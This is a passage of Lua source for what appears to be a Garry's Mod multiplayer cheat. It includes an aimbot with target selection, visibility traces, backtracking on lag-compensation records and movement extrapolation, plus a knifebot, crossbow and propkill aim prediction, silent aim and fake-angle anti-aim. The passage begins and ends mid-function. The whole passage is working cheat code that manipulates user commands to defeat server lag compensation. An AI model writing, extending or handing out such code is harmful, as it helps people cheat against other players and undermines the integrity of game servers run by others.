			local bone = ultimate.GetBones( v )[1]
			local dir = pLocalPlayer:GetShootPos() - bone
			dir:Normalize()

			if !ultimate.VisibleCheck( v, bone, selfpred, dir ) then
				continue
			end
		end

        local pos = v:GetPos()
        if plypred then
            pos = pos + (v:GetVelocity() * flTickInterval) * plypred
        end

        valid[#valid+1] = { v, pos }
    end

    if mode == 1 then
        table.sort(valid, function( a, b )
            return ( a[2] - eyepos ):LengthSqr() < ( b[2] - eyepos ):LengthSqr()
        end)
    elseif mode == 2 then
        table.sort(valid, function( a, b )
            local aScr, bScr = a[2]:ToScreen(), b[2]:ToScreen()

            local aDist
            do
                local dx = ( screenWidth * 0.5 ) - aScr.x
                local dy = ( screenHeight * 0.5 ) - aScr.y
                aDist = dx * dx + dy * dy
            end

            local bDist
            do
                local dx = ( screenWidth * 0.5 ) - bScr.x
                local dy = ( screenHeight * 0.5 ) - bScr.y
                bDist = dx * dx + dy * dy
            end

            return aDist < bDist
        end)
    end

    if #valid == 0 then return end

    return valid
end

function ultimate.IsTickHittable( ply, cmd, tick )
    if jopa.GetLatency(0) > 1 then return false end

    local serverArriveTick = ultimate.flServerTime + jopa.GetLatency(0) + jopa.GetLatency(1)
    local diff = serverArriveTick - ultimate.btrecords[ ply ][ tick ].simulationtime

    if diff > ultimate.cfg.vars["Backtrack time"] / 1000 then return false end

    return true
end

function ultimate.FindBacktrack( cmd, ply )
    local ticks = #ultimate.btrecords[ ply ]
    local canhit = {}

    for i = 1, ticks do
        if ultimate.IsTickHittable( ply, cmd, i ) then
            canhit[ #canhit + 1 ] = i
        end
    end

    return canhit
end

function ultimate.FindFirstHittableTicks( ply, cmd )
    local tickcount = #ultimate.btrecords[ ply ]

    if !tickcount then return 1 end

    for i = 1, tickcount do
        if ultimate.IsTickHittable( ply, cmd, i ) then
            return i
        end
    end
end

do
    local lastdist, lasttick = 1337, 1

    function ultimate.FindClosestHittableTicks( ply, cmd )
        local mypos = pLocalPlayer:EyePos()
        local records = ultimate.btrecords[ ply ]
        local firstticks = ultimate.FindFirstHittableTicks( ply, cmd )
        local tickcount = #records

        if !tickcount or !firstticks then return 1 end

        lastdist = math.huge

        for i = 1, tickcount - firstticks do
            local mt = i + firstticks

            if ( records[ mt ].aimpos ):DistToSqr( mypos ) < lastdist then
                lastdist = ( records[ mt ].aimpos ):DistToSqr( mypos )
                lasttick = mt
            end
        end

        return lasttick
    end
end

function ultimate.SelectTarget( cmd )
    local plys = ultimate.GetSortedPlayers( ultimate.cfg.vars["Target selection"] )
    ultimate.target     = false


    if !plys then return end

    local maxplys       = ultimate.cfg.vars["Max targets"]
    local curplys       = #plys

    if maxplys != 0 and curplys > maxplys then
        curplys = maxplys
    end

    local vEyePos = pLocalPlayer:EyePos()

    local aimAng
    for i = 1, curplys do
		local ply = plys[i][1]







     if not ultimate.cfg.vars["Always backtrack"] then
            local bones = ultimate.GetBones( ply )

            for o = 1, #bones do
                local bone = bones[o]
                aimAng = ( bone - pLocalPlayer:EyePos() ):Angle()

                if ultimate.VisibleCheck( ply, bone, nil, aimAng:Forward() ) then 
                    ultimate.target = ply
                    return ply, bone, aimAng, false, 0
                end
            end

        elseif ultimate.cfg.vars["Extrapolation"] and ultimate.predicted[ ply ] then
            if not ultimate.predicted[ ply ].pos then return end

            aimAng = ( ultimate.predicted[ ply ].pos - pLocalPlayer:EyePos() ):Angle()

            ultimate.traceStruct.start = pLocalPlayer:EyePos()
            ultimate.traceStruct.endpos = ultimate.predicted[ ply ].pos
            ultimate.traceStruct.filter = pLocalPlayer
            ultimate.traceStruct.mask = MASK_SHOT

            local tr = TraceLine( ultimate.traceStruct )

            if !tr.Hit or tr.Entity == ply then
                ultimate.target = ply
                return ply, ultimate.predicted[ ply ].pos, aimAng, false, 0
            end
        end

        if ultimate.cfg.vars["Backtrack"] then
            local ticks = ultimate.FindBacktrack( cmd, ply )

            if ultimate.btrecords[ ply ] and not ply.break_lc then
                local ts = 0

                if ultimate.cfg.vars["Backtrack mode"] == 3 then
                    for p = 1, #ticks do
                        if not ultimate.btrecords[ ply ][ p ] then continue end

                        aimAng = ( ultimate.btrecords[ ply ][ p ].aimpos - pLocalPlayer:EyePos() ):Angle()

                        ultimate.traceStruct.start = pLocalPlayer:EyePos()
                        ultimate.traceStruct.endpos = ultimate.btrecords[ ply ][ p ].aimpos
                        ultimate.traceStruct.filter = pLocalPlayer
                        ultimate.traceStruct.mask = MASK_SHOT

                        local tr = TraceLine( ultimate.traceStruct )

                        if !tr.Hit or tr.Entity == ply then
                            ultimate.target = ply
                            ultimate.backtracktick = p

                            return ply, ultimate.btrecords[ ply ][ p ].aimpos, aimAng, true, p
                        end
                    end
                end

                if ultimate.cfg.vars["Backtrack mode"] == 3 then return end

                if ultimate.cfg.vars["Backtrack mode"] == 1 then
                    ts = ultimate.FindFirstHittableTicks( ply, cmd )
                elseif ultimate.cfg.vars["Backtrack mode"] == 2 then
                    ts = ultimate.FindClosestHittableTicks( ply, cmd )
                end

                if not ultimate.btrecords[ ply ][ ts ] then return end

                aimAng = ( ultimate.btrecords[ ply ][ ts ].aimpos - pLocalPlayer:EyePos() ):Angle()

                ultimate.traceStruct.start = pLocalPlayer:EyePos()
                ultimate.traceStruct.endpos = ultimate.btrecords[ ply ][ ts ].aimpos
                ultimate.traceStruct.filter = pLocalPlayer
                ultimate.traceStruct.mask = MASK_SHOT

                local tr = TraceLine( ultimate.traceStruct )

                if !tr.Hit or tr.Entity == ply then
                    ultimate.target = ply
                    ultimate.backtracktick = ts

                    return ply, ultimate.btrecords[ ply ][ ts ].aimpos, aimAng, true, ts
                end
            end
        end
	end
end

function ultimate.IsMovementKeysDown( cmd )

    if cmd:KeyDown( IN_MOVERIGHT ) then
        return true
    end

    if cmd:KeyDown( IN_MOVELEFT ) then
        return true
    end

    if cmd:KeyDown( IN_FORWARD ) then
        return true
    end

    if cmd:KeyDown( IN_BACK ) then
        return true
    end

    return false
end

function ultimate.MovementFix( cmd, wish_yaw )

	local pitch = math.NormalizeAngle( cmd:GetViewAngles().x )
	local inverted = -1

	if ( pitch > 89 || pitch < -89 ) then
		inverted = 1
	end

	local ang_diff = math.rad( math.NormalizeAngle( ( cmd:GetViewAngles().y - wish_yaw ) * inverted ) )

	local forwardmove = cmd:GetForwardMove()
	local sidemove = cmd:GetSideMove()

	local new_forwardmove = forwardmove * -math.cos( ang_diff ) * inverted + sidemove * math.sin( ang_diff )
	local new_sidemove = forwardmove * math.sin( ang_diff ) * inverted + sidemove * math.cos( ang_diff )

	cmd:SetForwardMove( new_forwardmove )
	cmd:SetSideMove( new_sidemove )
end

function ultimate.DoSilentAngleUpdate( UserCmd )
    local pWeapon = pLocalPlayer:GetActiveWeapon()

    if ( IsValid( pWeapon ) ) then
        if ( pWeapon.FreezeMovement and pWeapon:FreezeMovement() ) then
            return
        end

        local bIsInUse = UserCmd:KeyDown( IN_USE ) or pLocalPlayer:KeyDown(IN_USE)

        if ( pWeapon:GetClass() == "weapon_physgun" and IsValid( pWeapon:GetInternalVariable( "m_hGrabbedEntity" ) ) and bIsInUse ) then
            return
        end
    end

    local mYaw = GetConVar( "m_yaw" ):GetFloat()
    local mPitch = GetConVar( "m_pitch" ):GetFloat()

    local silentAngle = ultimate.SilentAngle

    silentAngle.x = math.Clamp( silentAngle.x + UserCmd:GetMouseY() * mPitch, -89, 89 )
    silentAngle.y = silentAngle.y + UserCmd:GetMouseX() * -mYaw
    silentAngle.r = 0

    silentAngle:Normalize()

    return silentAngle
end





















// Knife bot ( Etot zaichik knifer )

ultimate.knifes = {}

ultimate.knifes[1] = {
    str = "csgo_",

    canbackstab = true,

    leftdmg = 25,
    leftdmgb = 90,
    leftdist = 64*64,

    rightdmg = 65,
    rightdmgb = 180,
    rightdist = 48*48,
}

ultimate.knifes[2] = {
    str = "swb_",

    canbackstab = false,

    leftdmg = 10,
    leftdmgb = 10,
    leftdist = 50*50,

    rightdmg = 40,
    rightdmgb = 40,
    rightdist = 50*50,
}

ultimate.knifes[3] = {
    str = "weapon_crowba",

    canbackstab = false,

    leftdmg = 10,
    leftdmgb = 10,
    leftdist = 75*75,

    rightdmg = 10,
    rightdmgb = 10,
    rightdist = 75*75,
}

ultimate.knifes[4] = {
    str = "hvh_kn",

    canbackstab = true,

    leftdmg = 25,
    leftdmgb = 90,
    leftdist = 64*64,

    rightdmg = 65,
    rightdmgb = 180,
    rightdist = 48*48,
}

ultimate.knifes[5] = {
    str = "umb_",

    canbackstab = false,

    leftdmg = 1000,
    leftdmgb = 1000,
    leftdist = 300*300,

    rightdmg = 1000,
    rightdmgb = 1000,
    rightdist = 300*300,
}

function ultimate:EntityFaceBack( ent )
    local angle = pLocalPlayer:GetAngles().y - ent:GetAngles().y

    if angle < -180 then angle = 360 + angle end

    if angle <= 90 and angle >= -90 then return true end

    return false
end

function ultimate.CanStab( ent, pos, health )
    local mypos = pLocalPlayer:GetShootPos()
    local tbl = ultimate.knifes[1]
    local wc = pLocalPlayer:GetActiveWeapon():GetClass()
    local canuse = false

    for i = 1, #ultimate.knifes do
        if string.StartWith(wc,ultimate.knifes[i].str) then
            canuse = true
            tbl = ultimate.knifes[i]
            break
        end
    end

    if not canuse then return false, false end

    if ultimate.canBacktrack( ent ) and ultimate.btrecords[ent][ultimate.backtracktick] then
        pos = ultimate.btrecords[ ent ][ ultimate.backtracktick ].aimpos
    end

    local backstab = tbl.canbackstab and ultimate:EntityFaceBack( ent ) or false
    local dist = mypos:DistToSqr( pos )
    local mode = ultimate.cfg.vars["Knifebot mode"]

    if mode == 1 then // Damage mode - tries to inflict biggest possible damage
        if backstab and dist < tbl.rightdist then
            return true, true
        elseif dist < tbl.leftdist and ( ( backstab and health - tbl.leftdmgb <= 0 ) or ( health - tbl.leftdmg <= 0 ) ) then
            return true, false
        elseif dist < tbl.rightdist or  ( dist < tbl.rightdist and health - tbl.leftdmg > 0 )  then
            return true, true
        end
    elseif mode == 2 then // Fast - tries to hit fast as possible
        if dist < tbl.rightdist then
            return true, true
        elseif dist < tbl.leftdist then
            return true, false
        end
    elseif mode == 3 then // Fatal - deals only fatal damage
        if dist < tbl.leftdist and ( ( backstab and health - tbl.leftdmgb <= 0 ) or ( health - tbl.leftdmg <= 0 ) ) then
            return true, false
        elseif dist < tbl.rightdist and ( ( backstab and health - tbl.rightdmgb <= 0 ) or ( health - tbl.rightdmg <= 0 ) ) then
            return true, true
        end
    end

    return false, false
end

// Crossbow prediction

function ultimate.CrossbowPred( cmd )
    if not ultimate.CanShoot( cmd ) then return end

    local plys = ultimate.GetSortedPlayers( ultimate.cfg.vars["Target selection"] )

    if !plys then return end

    for i = 1, #plys do
        local ply = plys[i][1]

        local eyePos        = pLocalPlayer:EyePos()

        local plyPos        = ply:GetPos()
        local plyCenter     = ply:OBBCenter()

        local aimPos        = plyPos + plyCenter
        local aimAngle      = ( aimPos - eyePos ):Angle()
        local aimVector     = aimAngle:Forward()

        local velStart      = aimVector * 3500

        local distance      = eyePos:Distance( aimPos )
        local travelTime    = distance / 3500

        // Movement simulation
        local predTime      = ( jopa.GetLatency( 0 ) + jopa.GetLatency( 1 ) ) + travelTime

        --if predTime > ultimate.cfg.vars["Simulation limit"] then continue end

        jopa.StartSimulation( ply:EntIndex() )

        for i = 1, ultimate.TIME_TO_TICKS( predTime ) do
            jopa.SimulateTick()
        end

        local data          = jopa.GetSimulationData()

        aimPos              = data.m_vecAbsOrigin + plyCenter
        distance            = eyePos:Distance( aimPos )
        travelTime          = distance / 3500

        jopa.FinishSimulation()

        // Gravity simulation
        local gravity       = GetConVar("sv_gravity"):GetFloat() * 0.05
        gravity             = ( gravity * flTickInterval ) * ultimate.TIME_TO_TICKS( travelTime )

        aimPos.z            = aimPos.z + gravity

        // Aimbot

        local finalVec = Vector( aimPos.x, aimPos.y, aimPos.z )
        local finalAng = ( finalVec - eyePos ):Angle()
        finalAng:Normalize()

        debugoverlay.Line( plyPos + plyCenter, finalVec, 0.1, color_white, true )

        cmd:SetViewAngles( finalAng )
    end
end

local sv_airaccelerate = GetConVar( "sv_airaccelerate" )

function ultimate.PredictVelocityExtrapolate( vel, yaw, fmove, smove, accel, maxspeed )

	local viewangles = Angle( 0, yaw, 0 )

	local forward = viewangles:Forward()
	local right = viewangles:Right()
 
	forward.z = 0
	right.z = 0
 
	forward:Normalize()
	right:Normalize()
 
	local wishdir = Vector( forward.x*fmove + right.x*smove, forward.y*fmove + right.y*smove, 0 )
	local wishspeed = wishdir:Length()
 
	wishdir:Normalize()
 
	if ( wishspeed != 0 && wishspeed > maxspeed ) then
		wishspeed = maxspeed
	end
 
	local wishspd = wishspeed
 
	if ( wishspd > 30 ) then
		wishspd = 30
	end
 
	local currentspeed = vel:Dot( wishdir )
	local addspeed = wishspd - currentspeed
 
	if ( addspeed <= 0 ) then
		return
	end
 
	local accelspeed = accel * wishspeed
 
	if ( accelspeed > addspeed ) then
		accelspeed = addspeed
	end

	local newvel = wishdir * accelspeed
 
	vel:Add( newvel )
	
end


function ultimate.PredictMovementExtrapolate( target_ply, extrapolation_ticks )
    local sv_gravity = GetConVar( "sv_gravity" )
    local sv_sticktoground = GetConVar( "sv_sticktoground" )

	local pm
	
	local vel_yaw
	local vel_yaw_delta
	
	local frametime = TickInterval
	local maxspeed = target_ply:GetMaxSpeed()
	local jump_power = target_ply:GetJumpPower()
	local accel = sv_airaccelerate:GetFloat() * frametime
	local half_gravity = sv_gravity:GetFloat() * frametime * 0.5
	local stick_to_ground = sv_sticktoground:GetBool()
	local origin = target_ply:GetPos()
	local velocity = target_ply:GetAbsVelocity()
	local mins, maxs = target_ply:GetCollisionBounds()
	local on_ground = target_ply:IsFlagSet( FL_ONGROUND )
	local ducking = target_ply:IsFlagSet( FL_DUCKING )
	local strafe_type = target_ply.m_nStrafeType
	local angle = target_ply.m_flAirAngle
	
	local fmove = 0
	local smove
	
	if ( strafe_type == STRAFE_LEFT ) then
		smove = -cl_sidespeed
	elseif ( strafe_type == STRAFE_RIGHT ) then
		smove = cl_sidespeed
	else
		smove = 0
	end

	for i = 1, extrapolation_ticks do
	
		velocity.z = velocity.z - half_gravity
	
		if ( on_ground ) then
		
			if ( ducking ) then
				velocity.z = jump_power
			else
				velocity.z = velocity.z + jump_power
			end
			
			velocity.z = velocity.z - half_gravity
			
		end

		if ( strafe_type == STRAFE_STRAIGHT ) then
		
			vel_yaw = math.NormalizeAngle( math.deg( math.atan2( velocity.y, velocity.x ) ) )
			vel_yaw_delta = math.NormalizeAngle( angle - vel_yaw )
			smove = ( vel_yaw_delta > 0 ) && -cl_sidespeed || cl_sidespeed
		
		else
		
			vel_yaw = math.NormalizeAngle( math.deg( math.atan2( velocity.y, velocity.x ) ) + angle )
		
		end
 
		ultimate.PredictVelocityExtrapolate( velocity, vel_yaw, fmove, smove, accel, maxspeed )
 
		local endpos = origin + ( velocity * frametime )
 
		pm = util.TraceHull( {
			start = origin,
			endpos = endpos,
			maxs = maxs,
			mins = mins,
			filter = target_ply,
			mask = MASK_PLAYERSOLID,
			collisiongroup = COLLISION_GROUP_PLAYER_MOVEMENT
		} )
 
		if ( pm.Fraction != 1 ) then
 
			local time_left = frametime
 
			for j = 1, 2 do
 
				time_left = time_left - ( time_left * pm.Fraction )
 
				local dot = velocity:Dot( pm.HitNormal )
 
				velocity = velocity - ( pm.HitNormal * dot )
 
				dot = velocity:Dot( pm.HitNormal )
 
				if ( dot < 0 ) then
					velocity = velocity - ( pm.HitNormal * dot )
				end
 
				endpos = pm.HitPos + ( velocity * time_left )
 
				pm = util.TraceHull( {
					start = pm.HitPos,
					endpos = endpos,
					maxs = maxs,
					mins = mins,
					filter = target_ply,
					mask = MASK_PLAYERSOLID,
					collisiongroup = COLLISION_GROUP_PLAYER_MOVEMENT
				} )

				if ( pm.Fraction == 1 ) then
					break
				end
 
			end
 
		end
 
		origin = pm.HitPos
 
		if ( !stick_to_ground && velocity.z > 140 ) then
 
			on_ground = false
 
		else
 
			pm = util.TraceHull( {
				start =  Vector( origin.x, origin.y, origin.z + 2 ),
				endpos = Vector( origin.x, origin.y, origin.z - 1 ),
				maxs = Vector( maxs.x, maxs.y, maxs.z * 0.5 ),
				mins = mins,
				filter = target_ply,
				mask = MASK_PLAYERSOLID,
				collisiongroup = COLLISION_GROUP_PLAYER_MOVEMENT
			} )
 
			on_ground = ( pm.Entity != NULL && pm.HitNormal.z >= 0.7 )
 
		end
 
		if ( on_ground ) then
			velocity.z = 0
		else
			velocity.z = velocity.z - half_gravity
		end
	
	end
	
	return origin

end

function ultimate.PredictPolynomialExtrapolate(ply, extrapolation_ticks)
    local history = ply.m_PositionHistory
    if not history or #history < 2 then
        return ply:GetPos() + (ply:GetAbsVelocity() * engine.TickInterval() * extrapolation_ticks)
    end

    local dt = engine.TickInterval()
    local t = extrapolation_ticks * dt
    local p0 = history[1].pos
    local p1 = history[2].pos

    if #history >= 3 then
        local p2 = history[3].pos
        -- v1 = (p0 - p1) / dt_1
        -- v2 = (p1 - p2) / dt_2
        -- a = (v1 - v2) / dt_avg
        
        local dt1 = history[1].time - history[2].time
        local dt2 = history[2].time - history[3].time
        
        if dt1 > 0 and dt2 > 0 then
            local v1 = (p0 - p1) / dt1
            local v2 = (p1 - p2) / dt2
            local accel = (v1 - v2) / ((dt1 + dt2) * 0.5)
            
            -- P(t) = p0 + v1*t + 0.5*accel*t^2
            return p0 + v1 * t + accel * (0.5 * t * t)
        end
    end

    local dt1 = history[1].time - history[2].time
    if dt1 > 0 then
        local v1 = (p0 - p1) / dt1
        return p0 + v1 * t
    end

    return p0 + (ply:GetAbsVelocity() * t)
end

function ultimate.FindBestAirAngle( vel_start, vel_end, sim_ticks, accel, maxspeed )

    local find_air_angle_step = 0.1
    local find_air_angle_limit = 10

    local cl_forwardspeed = 10000
    local cl_sidespeed = 10000

    local STRAFE_NONE = 0
    local STRAFE_LEFT = 1
    local STRAFE_RIGHT = 2
    local STRAFE_STRAIGHT = 3

	local strafe_type = STRAFE_NONE
	local best_angle = 0
	
	if ( sim_ticks <= 0 || sim_ticks > 24 ) then
		return strafe_type, best_angle
	end
	
	local vel_delta = vel_end - vel_start
	local vel_delta_len_sqr = vel_delta:Length2DSqr()

	if ( vel_delta_len_sqr < 0.01 ) then
		return strafe_type, best_angle
	end
	
	local vel_yaw_start = math.NormalizeAngle( math.deg( math.atan2( vel_start.y, vel_start.x ) ) )
	local vel_yaw_end = math.NormalizeAngle( math.deg( math.atan2( vel_end.y, vel_end.x ) ) )
	local vel_yaw_delta = math.NormalizeAngle( vel_yaw_end - vel_yaw_start )
	local vel_yaw_avg = math.NormalizeAngle( vel_yaw_start + ( vel_yaw_delta / 2 ) )
	
	local fmove = 0
	local smove = ( vel_yaw_delta > 0 ) && -cl_sidespeed || cl_sidespeed
	
	local strafe_dir = ( vel_yaw_delta > 0 ) && STRAFE_LEFT || STRAFE_RIGHT
	local angle_step = find_air_angle_step
	local min_vel_delta_len_sqr = vel_delta_len_sqr
	
	for i = 1, 2 do
	
		local angle = 0

		while ( math.abs( angle ) <= find_air_angle_limit ) do
		
			local pred_vel = vel_start
		
			for j = 1, sim_ticks do
			
				local pred_vel_yaw = math.NormalizeAngle( math.deg( math.atan2( pred_vel.y, pred_vel.x ) ) + angle )

				ultimate.PredictVelocityExtrapolate( pred_vel, pred_vel_yaw, fmove, smove, accel, maxspeed )
			
			end
			
			vel_delta = vel_end - pred_vel
			vel_delta_len_sqr = vel_delta:Length2DSqr()

			if ( vel_delta_len_sqr < min_vel_delta_len_sqr ) then
			
				min_vel_delta_len_sqr = vel_delta_len_sqr
				strafe_type = strafe_dir
				best_angle = angle
			
			end
		
			angle = angle + angle_step
		
		end
		
		angle_step = angle_step * -1
	
	end
	
	for i = 1, 2 do
	
		local angle = 0

		while ( math.abs( angle ) <= find_air_angle_limit ) do
		
			local pred_vel = vel_start
		
			for j = 1, sim_ticks do
			
				local pred_vel_yaw = math.NormalizeAngle( math.deg( math.atan2( pred_vel.y, pred_vel.x ) ) )
				local pred_vel_yaw_delta = math.NormalizeAngle( vel_yaw_avg + angle - pred_vel_yaw )
				smove = ( pred_vel_yaw_delta > 0 ) && -cl_sidespeed || cl_sidespeed

				ultimate.PredictVelocityExtrapolate( pred_vel, pred_vel_yaw, fmove, smove, accel, maxspeed )
			
			end
			
			vel_delta = vel_end - pred_vel
			vel_delta_len_sqr = vel_delta:Length2DSqr()

			if ( vel_delta_len_sqr < min_vel_delta_len_sqr ) then
			
				min_vel_delta_len_sqr = vel_delta_len_sqr
				strafe_type = STRAFE_STRAIGHT
				best_angle = vel_yaw_avg + angle
			
			end
		
			angle = angle + angle_step
		
		end
		
		angle_step = angle_step * -1
	
	end
	
	return strafe_type, best_angle

end 


// Propkill aimbot

ultimate.grabbingEnt = false

function ultimate.DrawPhysgunBeam( ply, wep, e, tar, bone, hitpos )
    if ply != pLocalPlayer then return end

    ultimate.grabbingEnt = IsValid( tar ) and tar or false
end

ultimate.predictedPoint = {}
function ultimate.PropAim( cmd )
    if not ultimate.grabbingEnt or not IsValid( ultimate.grabbingEnt ) or not cmd:KeyDown( IN_ATTACK ) then return end

    local plys = ultimate.GetSortedPlayers( ultimate.cfg.vars["Target selection"] )
    ultimate.target = false
    ultimate.targetVector = false

    if !plys then return end

    for i = 1, #plys do
        local ply           = plys[i][1]

        local eyePos        = pLocalPlayer:EyePos()

        local plyPos        = ply:GetPos()
        local plyVel        = ply:GetVelocity()
        local plyCenter     = ply:OBBCenter()
        local plySpeed      = plyVel:Length()
        //local plyPred       = plyPos + plyVel * flTickInterval

        local propPos       = ultimate.grabbingEnt:GetPos()
        local propVel       = ultimate.grabbingEnt:GetVelocity()
        local propSpeed     = propVel:Length()

        local distance      = plyPos:Distance( propPos )
        local plydist       = plyPos:Distance( eyePos )

        if plydist >= 4096 then continue end

        local travelTime    = distance / propSpeed
        //local predTime      = ( jopa.GetLatency( 0 ) + jopa.GetLatency( 1 ) ) + travelTime

        --if travelTime > ultimate.cfg.vars["Simulation limit"] then continue end // predTime

        // Prediction

        jopa.StartSimulation( ply:EntIndex() )

        for i = 1, ultimate.TIME_TO_TICKS( travelTime ) do // predTime
            jopa.SimulateTick()
        end

        local data          = jopa.GetSimulationData()
        local aimPos        = data.m_vecAbsOrigin + plyCenter

        distance            = aimPos:Distance( propPos )
        travelTime          = distance / propSpeed

        jopa.FinishSimulation()

        // Mouse wheel shit

        local deltaDistance = plydist - distance
        local scrollDelta = -deltaDistance

        // Aim

        local aimAng        = ( aimPos - pLocalPlayer:EyePos() ):Angle()
        aimAng:Normalize()

        cmd:SetMouseWheel( scrollDelta )
        cmd:SetViewAngles( aimAng )

        /* Method 1
        local scrollDelta = 0

        if distance == 0 then
            scrollDelta = 0
        elseif propSpeed > plySpeed then
            scrollDelta = - ( distance / propSpeed )
        else
            scrollDelta = distance / plySpeed
        end
        */


        /*




        local predticks = ultimate.TIME_TO_TICKS( jopa.GetLatency(0) + jopa.GetLatency(1) ) + 1

        jopa.StartSimulation( ply:EntIndex() )

        for i = 1, predticks do
            jopa.SimulateTick()
        end

        local data = jopa.GetSimulationData()

        pos = data.m_vecAbsOrigin + ply:OBBCenter()

        jopa.FinishSimulation()

        local dist = pos:DistToSqr( pLocalPlayer:EyePos() )

        local clr = dist < 16777216 and Color( 0, 255, 0 ) or Color( 255, 0, 0 )

        debugoverlay.Line( pos, ultimate.grabbingEnt:GetPos(), 0.1, clr, true )
        debugoverlay.Box( pos - ply:OBBCenter(), ply:OBBMins(), ply:OBBMaxs(), 0.1, Color( 255, 15, 15, 32 ) )

        if dist >= 16777216 then continue end

        local aimAng = ( pos - pLocalPlayer:EyePos() ):Angle()
        local ppd = ultimate.grabbingEnt:GetPos():DistToSqr( pos )

        local cd = ultimate.cfg.vars["PA thrower dist"]
        if ppd < ( cd * cd ) and ultimate.cfg.vars["PA thrower"] then
            cmd:RemoveKey( IN_ATTACK )
        end

        local bmd = math.sqrt( dist - ppd )

        if ( dist - ppd ) < 0 then bmd = 0 end

        local scrollDelta = math.ceil( bmd > 0 and -ppd or ppd )

        if scrollDelta > 5000 then
            scrollDelta = 5000
        elseif scrollDelta < -5000 then
            scrollDelta = -5000
        end

        print( "SDelta", scrollDelta, "BMD", bmd, "PPD", ppd )

        cmd:SetMouseWheel( scrollDelta )
        cmd:SetViewAngles( aimAng )
        */
    end
end

function ultimate.ResolveSequence(ply)
    local simtime = jopa.GetSimulationTime(ply)
    if not ultimate.cfg.vars["Sequence resolver"] then return simtime end
    
    local curtime = CurTime()
    if math.abs(simtime - curtime) > 1.0 then
        local diff = simtime - curtime
        local seconds = math.floor(diff)
        simtime = simtime - seconds
    end

    return simtime
end

function ultimate.Aim(cmd)
    ultimate.AntiAim(cmd)

    local tickrate = ultimate.TIME_TO_TICKS(1)
    local latency = jopa.GetLatency(0)
    local latency_ticks = ultimate.TIME_TO_TICKS(latency)
    local corrected_latency = math_Clamp(latency, 0, 1)

    if ultimate.SendPacket then
        ultimate.fakeAngles.angle = cmd:GetViewAngles()
        ultimate.fakeAngles.movex = pLocalPlayer:GetPoseParameter("move_x")
        ultimate.fakeAngles.movey = pLocalPlayer:GetPoseParameter("move_y")

        local layers = {}

        for i = 0, 13 do
            if pLocalPlayer:IsValidLayer(i) then
                layers[i] = {
                    cycle = pLocalPlayer:GetLayerCycle(i),
                    sequence = pLocalPlayer:GetLayerSequence(i),
                    weight = pLocalPlayer:GetLayerWeight(i)
                }
            end
        end

        ultimate.fakeAngles.origin = pLocalPlayer:GetNetworkOrigin()
        ultimate.fakeAngles.seq = pLocalPlayer:GetSequence()
        ultimate.fakeAngles.cycle = pLocalPlayer:GetCycle()
    else
        ultimate.realAngle = cmd:GetViewAngles()
    end

    local ply, bone, aimang, backtracking, bttick = ultimate.SelectTarget(cmd)

    local w = me:GetActiveWeapon()

    ultimate.targetVector = bone

    if not aimang then return end

    aimang:Normalize()

    if not ultimate.cfg.vars["Enable aimbot"] or not ply then return end

    local targetTime = ultimate.ResolveSequence(ply) 
    local timeOffset = jopa.GetCurTime() - targetTime

    local serverArriveTick = jopa.GetCurTime() + jopa.GetLatency(0) + jopa.GetLatency(1)
    local diff = serverArriveTick - targetTime

    --if diff > 1 and ultimate.cfg.vars["Adjust tickcount"] then return end

    local ent_time = jopa.GetSimulationTime( ply )
    local valid = math.abs( corrected_latency - ( ultimate.TICKS_TO_TIME( engine.TickCount() ) + latency - ent_time ) ) <= 0.2

    local oldAimAng = aimang
    local finalAngle = aimang

    local ExtrPos = bone
    local Extrapolate = false

    local saved_pos = ply:GetPos()

    local extrapolated_pos = saved_pos

    local nullvelocity = ply:GetVelocity():Length() > 2

    if ultimate.cfg.vars["Extrapolation"] and ( !valid ) and nullvelocity then    
        
        if ply.m_needStrafeCalc and ply.m_nSimulationTicks and ply.m_nSimulationTicks > 0 then
            ply.m_nStrafeType, ply.m_flAirAngle = ultimate.FindBestAirAngle(
                ply.m_vecOldVelocity,
                ply:GetAbsVelocity(),
                ply.m_nSimulationTicks,
                sv_airaccelerate:GetFloat() * engine.TickInterval(),
                ply:GetMaxSpeed()
            )
            ply.m_needStrafeCalc = false
        end
        
        if ( ply.m_nSimulationTicks > 0 ) then		
            local delta_ticks = math_max( 0, engine.TickCount() - ply.m_nLastUpdateTick )
            local extrapolation_ticks = math_floor( ( delta_ticks + latency_ticks ) / ply.m_nSimulationTicks ) * ply.m_nSimulationTicks	
            if ( extrapolation_ticks >= ply.m_nSimulationTicks && extrapolation_ticks <= tickrate ) then	
                
                if ply.m_nStrafeType != 0 then
                    extrapolated_pos = ultimate.PredictMovementExtrapolate(ply, extrapolation_ticks)
                else
                    extrapolated_pos = ultimate.PredictPolynomialExtrapolate(ply, extrapolation_ticks)
                end
                
                ply:SetPos( extrapolated_pos )
                valid = false		
                Extrapolate = true
            end			
        end			
    end	

    jopa.InvalidateBoneCache( ply )
    ply:SetupBones()

    if ultimate.cfg.vars["Extrapolation"] and Extrapolate and not backtracking then
    
        local bone_index = ultimate.ParseBones( ply, ultimate.cfg.vars["Hitbox selection"] )
        
        local bone_matrix = ply:GetBoneMatrix( ply:GetHitBoxBone( bone_index, ply:GetHitboxSet() ) )
        local mins, maxs = ply:GetHitBoxBounds( bone_index, ply:GetHitboxSet() )

        mins = bone_matrix * mins
        maxs = bone_matrix * maxs
        
        local center = (mins + maxs) * 0.5
    
        ExtrPos = center
        finalAngle = (ExtrPos - me:EyePos()):Angle()
        finalAngle:Normalize()
        
        local start = me:GetShootPos()
        local dir = center - start
        dir:Normalize()
        local endpos = start + dir * 8192
        
        ultimate.traceStruct.start = start
        ultimate.traceStruct.endpos = endpos
        ultimate.traceStruct.filter = me
        ultimate.traceStruct.mask = MASK_SHOT

        local tr = TraceLine( ultimate.traceStruct )

        ply:SetPos( saved_pos )

        if ultimate.cfg.vars["Show extrapolation line"] then
            debugoverlay.Line(saved_pos, extrapolated_pos, 0.1, Color(255, 255, 0), true)
            debugoverlay.Cross(saved_pos, 5, 0.1, Color(0, 255, 0), true)
            debugoverlay.Cross(extrapolated_pos, 5, 0.1, Color(255, 0, 0), true)
            debugoverlay.Cross(ExtrPos, 3, 0.1, Color(0, 0, 255), true) 
        end

        if ( tr.Entity != ply ) then
            return
        end
    end

    local oldangs = Angle(aimang)

    if ultimate.cfg.vars["Always backtrack"] and not backtracking then return end

    if ultimate.cfg.vars["Fov limit"] then
        local fov = ultimate.cfg.vars["Aimbot FOV"]

		local view = ultimate.cfg.vars["Silent aim"] and ultimate.SilentAngle or cmd:GetViewAngles()
		local ang = aimang - view

		ang:Normalize()

		ang = math.sqrt(ang.x * ang.x + ang.y * ang.y)

        if ang > fov then
            ultimate.targetVector = false
		    return
        end
    end

